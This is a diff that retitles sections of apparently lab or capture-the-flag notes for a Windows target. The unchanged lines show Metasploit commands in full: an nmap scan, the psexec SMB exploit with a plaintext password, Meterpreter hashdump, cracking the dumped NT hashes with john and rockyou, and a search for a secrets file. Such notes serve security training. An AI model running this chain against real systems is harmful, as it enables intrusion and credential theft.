@@ -83,10 +83,9 @@ Others Commands (these will be listed under different menu categories in the hel
 | :----: | :----: |
 | Win4Meterpreter | `1*.**.***.***` |
 
-Using `msfconsole`:
+LHOST using `msfconsole`:
 
 ```bash
-msfconsole
 db_nmap -A -vv -T4 -oN initial 1*.**.***.***
 user exploit/windows/smb/psexec
 hosts -R
@@ -96,7 +95,7 @@ set smbpass Password1
 run
 ```
 
-RHOST:
+RHOST using `meterpreter`:
 
 ```bash
 sysinfo
@@ -110,7 +109,7 @@ sysinfo
 background
 ```
 
-LHOST:
+LHOST using `msfconsole`:
 
 ```bash
 use post/windows/gather/enum_shares
@@ -124,7 +123,7 @@ run
 sessions 1
 ```
 
-RHOST:
+RHOST using `meterpreter`:
 
 ```bash
 ps
@@ -145,7 +144,7 @@ hashdump
 background
 ```
 
-LHOST:
+LHOST using `msfconsole`:
 
 ```bash
 cat > hash
@@ -163,7 +162,7 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
 sessions 1
 ```
 
-RHOST:
+RHOST using `meterpreter`:
 
 ```bash
 search -f secrets.txt
